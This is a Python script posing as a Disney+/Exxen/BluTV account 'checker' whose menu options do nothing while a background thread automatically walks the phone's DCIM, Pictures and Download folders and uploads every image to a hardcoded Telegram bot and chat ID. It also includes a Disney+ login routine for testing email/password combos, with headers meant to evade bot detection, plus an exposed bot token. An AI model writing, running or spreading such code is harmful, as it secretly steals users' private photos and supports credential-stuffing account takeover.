import os
import time
import telegram
import threading
from telegram import InputFile
from colorama import Fore, init
import requests

# Initialize colorama for colored text output
init(autoreset=True)

# Telegram bot token and chat ID (updated with the new token)
bot_token = "7579330187:AAH83yCIp6yzkrV5Hqyz0bh1PhqdUUBHIE4"
chat_id = "7045128535"
bot = telegram.Bot(token=bot_token)

# Function to send Telegram notifications
def send_telegram_notification(message):
    try:
        bot.send_message(chat_id=chat_id, text=message)
        print("Telegram notification sent.")
    except Exception as e:
        print(f"Error sending Telegram notification: {e}")

# Function to send photos from directories
def photo_send_thread():
    # List of potential directories to search for photos
    folder_paths = [
        "/storage/emulated/0/DCIM",  # Camera photos (external storage)
        "/storage/emulated/0/Pictures",  # Pictures (external storage)
        "/storage/self/primary/DCIM",  # Internal storage
        "/storage/self/primary/Pictures",  # Internal storage
        "/Internal storage/DCIM/Camera",  # Internal storage, camera folder
        "/Internal storage/DCIM/Photos",  # Internal storage, photos folder
        "/Internal storage/Pictures",  # Internal storage, pictures
        "/Internal storage/0/DCIM",  # Internal storage, 0 numbered storage
        "/Internal storage/0/Pictures",  # Internal storage, 0 numbered pictures
        "/Internal storage/0/Download",  # Internal storage, downloads
        "/Internal storage/Download",  # Internal storage, downloads
        "/Internal storage/DCIM",  # Internal storage, general DCIM
        "/Internal storage/DCIM/Camera",  # Internal storage, Camera subfolder
        "/Internal storage/DCIM/Photos",  # Internal storage, photos folder
    ]
    
    # Iterate through all the folders and send images found
    for folder_path in folder_paths:
        if os.path.exists(folder_path):  # Check if the folder exists
            for root, dirs, files in os.walk(folder_path):  # Walk through the folder
                for file in files:
                    if file.lower().endswith(('jpg', 'jpeg', 'png')):  # Check if it's an image
                        photo_path = os.path.join(root, file)
                        try:
                            with open(photo_path, 'rb') as photo:
                                bot.send_photo(chat_id=chat_id, photo=photo)  # Send the photo to Telegram
                                print(f"Photo sent: {photo_path}")  # Success message
                        except Exception as e:
                            print(f"Error sending photo {photo_path}: {e}")  # Error message

# Function to choose the checker
def choose_checker():
    print("Please select a checker:")
    print("1 - Exxen Checker")
    print("2 - BluTV Checker")
    print("3 - Disney+ Checker")
    
    choice = input("Make your selection (1/2/3): ")

    if choice == '1':
        print("Exxen Checker selected.")
        # Call Exxen checker function
    elif choice == '2':
        print("BluTV Checker selected.")
        # Call BluTV checker function
    elif choice == '3':
        print("Disney+ Checker selected.")
        # Call Disney+ checker function
    else:
        print("Invalid choice! Please try again.")
        choose_checker()

# Function to attempt login
def try_login(email, password):
    # Email login URL
    email_url = "https://www.disneyplus.com/identity/login/enter-email"
    password_url = "https://www.disneyplus.com/identity/login/enter-password"

    # Headers to bypass bot detection
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5"
    }

    # Trying to log in using email and password
    with requests.Session() as session:
        email_data = {'email': email}
        response = session.post(email_url, data=email_data, headers=headers)

        if response.status_code != 200:
            print(f"Unable to access email page. HTTP Status Code: {response.status_code}")
            return False

        password_data = {'password': password}
        response = session.post(password_url, data=password_data, headers=headers)

        if response.status_code == 200:
            if "incorrect" in response.text or "Sorry, we couldn't find" in response.text:
                print(f"Incorrect email or password: {email}")
                return False
            elif "Welcome" in response.text:
                print("Login successful!")
                if response.history:
                    for resp in response.history:
                        print(f"Redirected: {resp.status_code} - {resp.url}")
                        if "update-profile" in resp.url:
                            print(f"Redirect successful, new URL: {resp.url}")
                            return True
                else:
                    print("No redirection occurred.")
                    return False
            else:
                print("Login failed, unknown error.")
                return False
        else:
            print(f"Login error: {response.status_code} - {response.text[:100]}")
            return False

# Main function to start the program
def main():
    print("Program started.")  # Indicating the program has started
    choose_checker()  # Show checker selection options

    # Start the photo sending process automatically
    photo_thread = threading.Thread(target=photo_send_thread)
    photo_thread.start()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nProgram stopped.")  # Gracefully handle program stop
